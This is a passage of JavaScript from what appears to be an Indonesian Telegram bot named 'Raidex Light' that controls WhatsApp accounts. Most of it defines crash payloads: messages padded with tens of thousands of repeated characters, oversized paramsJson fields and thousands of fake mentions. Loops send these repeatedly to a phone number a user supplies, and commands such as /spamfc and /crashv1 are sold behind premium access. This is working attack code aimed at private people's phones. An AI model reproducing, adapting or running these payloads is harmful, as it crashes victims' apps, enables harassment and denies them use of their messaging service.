            directPath: "/o1/v/t24/f2/m237/AQPIYikiwi3m6cnqci3YWcDdEXK4pRdEoVuffum6NfmIgZS-w1l3p8hAUz650_FFQNJa0iCUOIRAEXUEi3_lrzuZXctdJEyYxC2eS0afzg?ccb=9-4&oh=01_Q5Aa3QGSiEmJ9tDlRgHnGNJx3KCFYCdyhmkeaq3eHDd1YLRxtw&oe=69631B8B&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1765450399",
            jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD", "base64")
          },
          productId: "253813391248495300",
          title: "— Zephyrinē E'scanor" + "ꦾ".repeat(25000) + "ꦽ".repeat(25000) + "\u2080".repeat(175000),
          currencyCode: "USD",
          priceAmount1000: "0",
          productImageCount: 1000000
        },
        businessOwnerJid: "225752674992330@lid"
      },
      messageContextInfo: {
        deviceListMetadata: {
          recipientKeyHash: "iGDumWoqJtlqxw==",
          recipientTimestamp: "1765411475"
        },
        deviceListMetadataVersion: 2,
        messageSecret: "WP/LUg2LGEOMfWhJuSzNtPrDi+L1RjGRiYo+45drhMc="
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", messages.message, {
    messageId: messages.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

async function delaymention(sock, target, mention) {
  const permissionStatusMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "— Raidex Version 1",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0"),
    }
  );

  const stickerMediaList = [
    {
      id: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      bufferKey: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      id: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      bufferKey: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      fileEncSha256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mediaKey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ];

  let mediaIndex = 0;

  const selectedMedia = stickerMediaList[mediaIndex];
  mediaIndex = (mediaIndex + 1) % stickerMediaList.length;

  const {
    id,
    uri,
    bufferKey,
    sid,
    fileSha256,
    fileEncSha256,
    mediaKey,
  } = selectedMedia;

  const mentionContext = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () =>
        `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
      ),
    ],
  };

  const animatedStickerStatus = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${bufferKey}=${id}&_nc_sid=${sid}&mms3=true`,
          fileSha256,
          fileEncSha256,
          mediaKey,
          mimetype: "image/webp",
          isAnimated: true,
          contextInfo: mentionContext,
        },
      },
    },
  };

  const addressFlowStatus = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "— Vorza Is Core!!!", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
        },
      },
    },
  };

  const callPermissionStatus = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "— Zephyrinē E'scanor", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
        },
      },
    },
  };

  const statusPayloads = [
    animatedStickerStatus,
    callPermissionStatus,
    addressFlowStatus,
  ];

  const massiveTextStatus = generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "— Raidex Light〣" + "ꦾ".repeat(50000),
      },
    },
    {}
  );

  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast", permissionStatusMsg.message, {
      messageId: permissionStatusMsg.key.id,
      statusJidList: [target],
    });

    for (const payload of statusPayloads) {
      const generatedMsg = generateWAMessageFromContent(target, payload, {});
      await sock.relayMessage("status@broadcast", generatedMsg.message, {
        messageId: generatedMsg.key.id,
        statusJidList: [target],
      });
    }

    await sock.relayMessage("status@broadcast", massiveTextStatus.message, {
      messageId: massiveTextStatus.key.id,
      statusJidList: [target],
    });

    if (i < 9) await new Promise(r => setTimeout(r, 5000));
  }

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: massiveTextStatus.key,
            type: 25,
          },
        },
      },
    });
  }
}

async function UIProto(sock, target) {
  const viewOnceMessageV2 = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "— Vorza I'm Crash",
            hasMediaAttachment: false
          },
          body: {
            message: "— Zephyrinē E'scanor" + "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000),
                }),
              },
            ],
            messageParamsJson: "[{".repeat(10000),
          },
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 50000000) +
                  "0@s.whatsapp.net"
              ),
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
            },
          },
        },
      },
    },
  };

  const viewOnceMessageV2Image = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "📞 Raidex Is Calling...",
            hasMediaAttachment: false,
          },
          body: {
            message:
              "〣 Raidex Light 〣" + "ꦽ".repeat(30000),
          },
          footer: {
            message: "ꦽ".repeat(10000),
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "" },
              { name: "cta_catalog", buttonParamsJson: "" },
              { name: "call_permission_request", buttonParamsJson: "." },
              { name: "cta_url", buttonParamsJson: "\u0003" },
            ],
            messageParamsJson: "{[".repeat(10000),
          },
          contextInfo: {
            stanzaId: "1" + Date.now(),
            isForwarded: true,
            forwardingScore: 999,
            participant: target,
            remoteJid: "0@s.whatsapp.net",
            mentionedJid: ["0@s.whatsapp.net"],
            quotedMessage: {
              groupInviteMessage: {
                groupJid: "0@g.us",
                groupName: "ꦽ".repeat(20000),
                inviteExpiration: Date.now() + 181440000000,
                caption: "〢 Raidex Version 4 〢",
                jpegThumbnail: "",
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, viewOnceMessageV2, {
    messageId: Date.now().toString(),
  });

  await sock.relayMessage(target, viewOnceMessageV2Image, {
    messageId: (Date.now() + 1).toString(),
  });
}

async function StcDelay(sock, target) {
  const invisibleInteractiveMessage = {
    interactiveResponseMessage: {
      body: {
        text: "❍━━Raidex Light━━❍",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: "\u0000".repeat(1045000),
        version: 3
      }
    }
  };
 
  const staticStickerMessage = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/v/t62.15575-24/553565456_854672337481212_2373784316894852529_n.enc?ccb=11-4&oh=01_Q5Aa3gGbB-EX4N8RMNwMgz1Uwcs4thDycy_FzWXmFqU9XaNxoQ&oe=698E1937&_nc_sid=5e03e0&mms3=true",
      fileSha256: "r8gYluZO87JI/Oar//rAUwFTgT7Fk9Zi8K/QndBlXPE=",
      fileEncSha256: "KBKYkvPBT9zDwDmAySriq6GeFyWLRrXVtOg015yl6WI=",
      mediaKey: "mPVuB6CT2e5DTzPrmfKkNEjr9LP8BFBTLAD+BjwNlvo=",
      mimetype: "image/webp",
      height: 64,
      width: 64,
      directPath: "/v/t62.15575-24/553565456_854672337481212_2373784316894852529_n.enc?ccb=11-4&oh=01_Q5Aa3gGbB-EX4N8RMNwMgz1Uwcs4thDycy_FzWXmFqU9XaNxoQ&oe=698E1937&_nc_sid=5e03e0",
      fileLength: "147174",
      mediaKeyTimestamp: "1768165417",
      isAnimated: false,
      stickerSentTs: "1768336429145",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false
    }
  };

  await sock.relayMessage(target, invisibleInteractiveMessage, {
    participant: { jid: target }
  });
  
  await sock.relayMessage(target, staticStickerMessage, {
    participant: { jid: target }
  });
}

async function RaidexInvis(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "X",
                    contentText:
                        "X",
                    footerText: "jid_menu",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "message_group" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "undefined" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
        
async function interactiveUIV3(target) {
  const randomLatitude = (Math.random() * 180 - 90).toFixed(6);
  const randomLongitude = (Math.random() * 360 - 180).toFixed(6);
  
  const header = {
    locationMessage: {
      degreesLatitude: parseFloat(randomLatitude),
      degreesLongitude: parseFloat(randomLongitude)
    },
    hasMediaAttachment: true
  };

  const body = {
    text: "⃤⃤⃤⃤⃤Raidex Light⃤⃤⃤⃤⃤" + "ꦾ".repeat(50000) + "ꦽ".repeat(50000)
  };

  const contextInfo = {
    mentionedJid: ["1@newsletter"],
    groupMentions: [{
      groupJid: "1@newsletter",
      groupSubject: "\u0000"
    }],
    quotedMessage: {
      documentMessage: {
        contactVcard: true
      }
    }
  };

  const interactiveMessage = {
    header: header,
    body: body,
    nativeFlowMessage: {},
    contextInfo: contextInfo
  };

  const ephemeralMessage = {
    message: {
      interactiveMessage: interactiveMessage
    }
  };

  const relayOptions = {
    participant: { jid: target },
    userJid: target
  };

  await sock.relayMessage(target, ephemeralMessage, relayOptions);
}

async function interactiveUIV4(target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "♱ Raidex Light" + "ꦾ".repeat(50000),
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "꧔".repeat(102000),
              version: 3,
            },
            contextInfo: {
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                newsletterName: "\u0000",
                serverMessageId: 9999999999
              },
              isForwarded: true
            }
          },
        },
      },
    },
    { 
      participant: { jid: target },
      userJid: target 
    }
  );
}
// End Function

// Jangan di ubah bagian ini. 
const delay = (ms) => new Promise(res => setTimeout(res, ms));
const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);

let count = 0;
let mention = true;

// Function Crash Message
async function crash(sock, target) {
   for (let i = 0; i < 50; i++) {
       await AndroXUI(sock, target);
       await slowDelay();
       await Cloreds(sock, target);
       await slowDelay();
       await UIProto(sock, target);
       await AndroXUI(sock, target);
       await slowDelay();
       await Cloreds(sock, target);
       await slowDelay();
       await UIProto(sock, target);
       await slowDelay();
       await interactiveUIV3(target);
       await slowDelay();
       await interactiveUIV4(target);
       await slowDelay();
       
       
   
   console.log(
      chalk.red(
        `[RAIDEX LIGHT] Proccesing Sent ${count}/50 Loop For ${target}`
      ) 
   );
     count++;
   }
}

// Function Invisible
async function invis(sock, target) {
   for (let i = 0; i < 50; i++) {
       await TrueNullV9(sock, target);
       await slowDelay();
       await Candydelay(sock, target);
       await slowDelay();
       await TrueNullV9(sock, target);
       await slowDelay();
       await Candydelay(sock, target);
       await slowDelay();
       await TrueNullV9(sock, target);
       await slowDelay();
       await Candydelay(sock, target);
       await slowDelay();
       await NullinvisDozer(sock, target);
       await slowDelay();
       await ExploitDelayV1(sock, target);
       await slowDelay();
       await nullbulldozer(sock, target);
       await slowDelay();
       await nullbulldozer(sock, target);
       await slowDelay();
       await delaymention(sock, target, mention);
       await slowDelay();
       await delaymention(sock, target, mention);
       await slowDelay();
       await StcDelay(sock, target);
       await slowDelay();
       await RaidexInvis(target, mention);
       await slowDelay();
   
   console.log(
      chalk.red(
        `[RAIDEX LIGHT] Proccesing Sent ${count}/50 Loop For ${target}`
      ) 
   );
     count++;
   }
}

// Function ForceClose Infinity
async function force(sock, target) {
   for (let i = 0; i < 50; i++) {
       await ZInvisF(sock, target);
       await slowDelay();
       await SpamInvis(target);
       await slowDelay();
       await ZInvisF(sock, target);
       await slowDelay();
       await SpamInvis(target);
       await slowDelay();
       await TrueNullV10(target);
       await slowDelay();
   
   console.log(
      chalk.red(
        `[RAIDEX LIGHT] Proccesing Sent ${count}/50 Loop For ${target}`
      ) 
   );
     count++;
   }
}

async function FunctionGb(sock, target) {
   for (let i = 0; i < 5; i++) {
      await groupUiCrash(target);
      await slowDelay();
      await SpamInvisGb(target);
      await slowDelay();
      await GroupFC(sock, target);
      await slowDelay();
      
   console.log(
      chalk.red(
        `[BUG GROUP] Proccesing Sent ${count}/5 Loop For ${target}`
      ) 
   );
     count++;
   }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id
  const username = msg.from.username
    ? `@${msg.from.username}`
    : "Tidak ada username"

  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  
  try {
  const { data } = await axios.get(SYSTEM_URL);

    if (data.maintenance === true) {
      return bot.sendMessage(chatId, data.message || "🚫 *Script telah di update*\n*Untuk melihat script dengan version baru nya silahkan contact owner untuk mengirim script terbaru.*", {
      parse_mode: "Markdown", 
        reply_markup: {
          inline_keyboard: [
            [{ text: "Contact Owner", url: "https://t.me/VorzaOffc" }]
          ]
        }
      });
    }

  // cek token
  if (!verified) {
    return bot.sendMessage(chatId, 
      "🚫 <b>Token Belum Verifikasi Token</b>\nUntuk verifikasi token silahkan click button di bawah.", { 
        parse_mode: "HTML", 
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "🔐 Verifikasi Token", 
                  callback_data: "verif_token"
                }
              ]
            ]
          }
        });
      }
  
  bot.sendPhoto(chatId, "raidex.png", {
    caption: `
<b>( ≛ ) Olà ${username},</b>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( 𖠄 ) Information Bot :</b>
▻ <b>Owner : @VorzaOffc</b>
▻ <b>BotName : Raidex Light</b>
▻ <b>Version : 5.0</b>
▻ <b>Prefix : / ( Slash )</b>
▻ <b>Language : JavaScript</b>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<pre><b>PAGE 1 / 5</b></pre>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( ♰ ) Information Users :</b>
▻ <b>Username : ${username}</b>
▻ <b>ID</b> : <code>${msg.from.id}</code>
▻ <b>Premium : ${premiumStatus}</b>

<blockquote><strong>Please Enter button to bellow!</strong></blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "𓆩 Open 𓆪", 
            callback_data: "back_to_main"
          }
        ], 
        [
          {
            text: "Information Update", 
            url: "https://t.me/RaidexInformation"
          }
        ]
      ]
    }
  });
  } catch (err) {
    console.log(`Maintenance Error ${err.message}`);
    bot.sendMessage(chatId, "❌ Maintenance Error Harap hubungi Developer!");
  }
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username
      ? `@${query.from.username}`
      : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `
<b>( ≛ ) Olà ${username},</b>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
( 𖠄 ) Information Bot :
▻ Owner : @VorzaOffc
▻ BotName : Raidex Light
▻ Version : 5.0
▻ Prefix : / ( Slash ) 
▻ Language : JavaScript
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<pre><b>PAGE 2 / 5</b></pre>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( ♰ ) Information Users :</b>
▻ Username : ${username}
▻ ID : ${query.from.id}
▻ Premium : ${premiumStatus}
▻ Runtime : ${runtime}
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( 𖨆 ) Bugs Menu :</b>
▻ /spamfc - 62xxx
╰➤ Spam Brutal ForceClose
▻ /xspam - 62xxx
╰➤ Spam Brutal Invisible Hard
▻ /crashv1 - 62xxx
╰➤ Crash Android V1
▻ /crashv2 - 62xxx
╰➤ Crash Android V2
▻ /ghost - 62xxx
╰➤ Invisible No Jejak
▻ /ghostv1 - 62xxx
╰➤ Invisible Hard no jejak V1
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
`;
      replyMarkup = {
        inline_keyboard: [
          [
            {
              text: "◀", 
              callback_data: "back_to_main"
            }, 
            {
              text: "Owner", 
              url: "https://t.me/VorzaOffc"
            }, 
            {
              text: "▶", 
              callback_data: "owner_menu"
            }
          ]
        ]
      };
    }
  
    if (query.data === "owner_menu") {
      caption = `
<b>( ≛ ) Olà ${username},</b>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
( 𖠄 ) Information Bot :
▻ Owner : @VorzaOffc
▻ BotName : Raidex Light
▻ Version : 5.0
▻ Prefix : / ( Slash ) 
▻ Language : JavaScript
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<pre><b>PAGE 3 / 5</b></pre>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( ♰ ) Information Users :</b>
▻ Username : ${username}
▻ ID : ${query.from.id}
▻ Premium : ${premiumStatus}
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( ◆ ) Owner Menu :</b>
▻ /addbot - 62xxx
╰➤ Add Sender
▻ /delbot - 62xxx
╰➤ Delete Sender
▻ /addprem - Id - Days
╰➤ Add Premium 
▻ /delprem - id
╰➤ Delete Premium
▻ /addadmin - id
╰➤ Add Admin
▻ /deladmin - id
╰➤ Delete Admin
▻ /addowner - id
╰➤ Add Owner 
▻ /delowner - id
╰➤ Delete Owner
▻ /setcd - time
╰➤ Settings Cooldown Bugs
▻ /listbot 
╰➤ Lihat semua sender
▻ /listprem
╰➤ Lihat semua premium
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
`;
      replyMarkup = {
        inline_keyboard: [
        [
          {
            text: "◀", 
            callback_data: "trashmenu"
          }, 
          {
            text: "Owner", 
            url: "https://t.me/VorzaOffc"
          }, 
          {
            text: "▶", 
            callback_data: "thanks"
          }
        ]
      ]
    };
  }
    
    if (query.data === "thanks") {
      caption = `
<b>( ≛ ) Olà ${username},</b>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
( 𖠄 ) Information Bot :
▻ Owner : @VorzaOffc
▻ BotName : Raidex Light
▻ Version : 5.0
▻ Prefix : / ( Slash ) 
▻ Language : JavaScript
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<pre><b>PAGE 4 / 5</b></pre>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( ♰ ) Information Users :</b>
▻ Username : ${username}
▻ ID : ${query.from.id}
▻ Premium : ${premiumStatus}
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( ※ ) Thanks To :</b> 
▻ @VorzaOffc
╰➤ The Developers
▻ @JentzyyOffc
╰➤ The Patners
▻ @KennethNvm
╰➤ The Patners
▻ Buyer
╰➤ Support
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
`;
      replyMarkup = {
        inline_keyboard: [
        [
            {
              text: "◀", 
              callback_data: "owner_menu"
            }, 
            {
              text: "Owner", 
              url: "https://t.me/VorzaOffc"
            }, 
            {
              text: "▶", 
              callback_data: "tools"
            }
        ]
      ]
    };
  }
    
    if (query.data === "tools") {
      caption = `
<b>( ≛ ) Olà ${username},</b>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
( 𖠄 ) Information Bot :
▻ Owner : @VorzaOffc
▻ BotName : Raidex Light
▻ Version : 5.0
▻ Prefix : / ( Slash ) 
▻ Language : JavaScript
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<pre><b>PAGE 5 / 5</b></pre>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( ♰ ) Information Users :</b>
▻ Username : ${username}
▻ ID : ${query.from.id}
▻ Premium : ${premiumStatus}
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
( ツ ) Tools Menu :
▻ /cekidch - Link Channels
╰➤ Lihat Id Channel WhatsApp
▻ /brat - Teks
╰➤ Membuat Sticker 
▻ /iqc - Teks
╰➤ Gambar Iphone
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
`, 
  replyMarkup = {
     inline_keyboard: [
        [
          {
            text: "◀", 
            callback_data: "thanks"
          }
        ], 
        [
          {
            text: "Information Update", 
            url: "https://t.me/VorzaInformation"
          }
        ]
      ]
    };
  }
    

    if (query.data === "back_to_main") {
      caption = `
<b>( ≛ ) Olà ${username},</b>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( 𖠄 ) Information Bot :</b>
▻ <b>Owner : @VorzaOffc</b>
▻ <b>BotName : Raidex Light</b>
▻ <b>Version : 5.0</b>
▻ <b>Prefix : / ( Slash )</b>
▻ <b>Language : JavaScript</b>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<pre><b>PAGE 1 / 5</b></pre>
<blockquote>━━━━━━━━━━━━━━━━═❍</blockquote>
<b>( ♰ ) Information Users :</b>
▻ Username : ${username}
▻ ID : <code>${query.from.id}</code>
▻ Premium : ${premiumStatus}

<blockquote><strong>Please Enter button to bellow!</strong></blockquote>
`;
      replyMarkup = {
         inline_keyboard: [
           [
             {
               text: "▶", 
               callback_data: "trashmenu"
             }
           ], 
           [
             {
               text: "Information Update", 
               url: "https://t.me/RaidexInformation"
             }
           ]
         ]
     };
  }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: "https://files.catbox.moe/jfl07g.jpg", 
        caption: caption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup,
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

//=======CASE BUG=========//
bot.onText(/\/spamfc (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak Ada nama";
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const runtime = getBotRuntime();
  const premiumStatus = getPremiumStatus(userId);
  
  try {
  const { data } = await axios.get(SYSTEM_URL);

    if (data.maintenance === true) {
      return bot.sendMessage(chatId, data.message || "🚫 *Script telah di update*\n\n*Untuk melihat script dengan version baru nya silahkan contact owner untuk mengirim script terbaru.*", {
      parse_mode: "Markdown", 
        reply_markup: {
          inline_keyboard: [
            [{ text: "Contact Owner", url: "https://t.me/VorzaOffc" }]
          ]
        }
      });
    }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "raidex.png", {
      caption: `<blockquote>
▣═━━━━━ 𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓 ━━━━━═▣</blockquote>
<b>Username</b> : <b>${username}</b>
<b>Status</b> : <b>${premiumStatus}</b>

<b><u>kamu tidak memliki acces, silahkan addpremium terlebih dahulu jika ingin memakai bugs tersebut.</u></b>
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝙱𝚄𝚈 𝙰𝙲𝙲𝙴𝚂",
              url: "https://t.me/VorzaOffc",
            }
          ],
        ],
      },
    });
  }

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/hcqdcj.jpg",
      {
        caption: `<blockquote><pre>
❍━━━━ 𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓 ━━━━❍
▻ Target : <b>${formattedNumber}</b>
▻ Command : /spamfc
▻ Pengirim : <b>${username}</b>
▻ Efek Bug : Spam ForceClose Tembus beta! 
▻ Status : ♻️ Memproses Mengirim bug... 
▻ Date Now : ${runtime}
▻ Type Script : Bebas spam bug! 
</pre></blockquote>`,
        parse_mode: "HTML",
      }
    );

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      await force(sock, jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `<blockquote><pre>
❍━━━━ 𝐑𝐀𝐈𝐃𝐄𝐗 𝐋𝐈𝐆𝐇𝐓 ━━━━❍
▻ Target : <b>${formattedNumber}</b>
▻ Command : /spamfc
▻ Pengirim : <b>${username}</b>
▻ Efek Bug : Spam ForceClose tembus beta
▻ Status : ✅ Succes mengirim bug! 
▻ Date Now : ${runtime}
▻ Type Script : Bebas spam bug! 

ʀᴀɪᴅᴇx - ʟɪɢʜᴛ ᴠᴇʀsɪᴏɴ 5</pre></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🎯 Cek Target", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
//------------------------------------------------------------------------------------------------------------------------------\\
function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

bot.onText(/\/blankgroup(?:\s(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);

  const args = msg.text.split(" ");
  const groupLink = args[1] ? args[1].trim() : null;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "raidex.png", {
      caption: `*Akses Di tolak*\nFitur ini hanya user premium
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Contact Owner",
              url: "https://t.me/VorzaOffc",
            },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }

    if (!groupLink) {
      return await bot.sendMessage(chatId, `Example: frezegroup <link>`);
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

